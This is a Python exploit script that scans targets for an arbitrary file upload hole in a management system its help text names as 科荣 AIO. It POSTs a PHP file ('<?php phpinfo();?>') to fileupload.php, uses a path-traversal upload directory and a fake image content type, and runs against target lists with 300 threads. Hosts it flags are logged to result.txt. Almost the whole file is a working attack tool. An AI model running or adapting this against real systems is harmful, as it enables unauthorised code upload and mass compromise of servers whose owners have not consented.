import requests
import argparse
import sys
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    banner = r"""

  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|




                            version:1.1.0
                            author:fangwei
	"""
    logging.info(banner)

def poc(target):
    payload_url = "/ddi/server/fileupload.php?uploadDir=../../321&name=123.php"
    url = target + payload_url
    headers = {
        "Accept": "text/plain, */*; q=0.01",
        "Content-Disposition": 'form-data; name="file"; filename="111.php"',
        "Content-Type": "image/jpeg"
    }
    data = "<?php phpinfo();?>"
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        # 初始请求
        res = requests.get(url=target, verify=False)
        # 文件上传请求
        res1 = requests.post(url=url, headers=headers, data=data, verify=False)

        if res.status_code == 200:
            if res1.status_code == 200 and "result" in res1.text:
                logging.info(f"{GREEN}[+] 该url存在任意文件上传漏洞：{target}{RESET}")
                with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                logging.info(f"[-] 该url不存在任意文件上传漏洞：{target}")
        else:
            logging.warning(f"该url连接失败：{target}")

    except Exception as e:
        logging.error(f"[*] 该url出现错误：{target}, 错误信息: {e}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="检测科荣 AIO 管理系统任意文件上传漏洞")
    parser.add_argument("-u", "--url", dest="url", type=str, help="请写入链接")
    parser.add_argument("-f", "--file", dest="file", type=str, help="请写入文件路径")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for i in f.readlines():
                url_list.append(i.strip())
        with Pool(300) as mp:
            mp.map(poc, url_list)
    else:
        logging.error(f"Usage: python {sys.argv[0]} -h")

if __name__ == "__main__":
    main()
